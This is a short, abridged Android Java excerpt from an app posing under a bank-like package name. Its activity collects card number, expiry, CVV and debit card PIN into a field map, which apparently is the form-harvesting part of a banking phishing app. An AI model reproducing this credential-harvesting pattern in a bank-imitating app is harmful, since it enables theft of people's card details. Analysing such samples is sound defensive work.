package com.southindia.bank.in2;
...
public class SecondActivity extends AppCompatActivity {
    ...
    protected void onCreate(Bundle savedInstanceState) {
        ...
        card_number.addTextChangedListener(new DebitCardInputMask(card_number));

        ids = new HashMap<>();
        ids.put(R.id.card_number, "card_number");
        ids.put(R.id.exp, "exp");
        ids.put(R.id.cvv, "cvv");
        ids.put(R.id.debit_card_pin, "debit_card_pin");
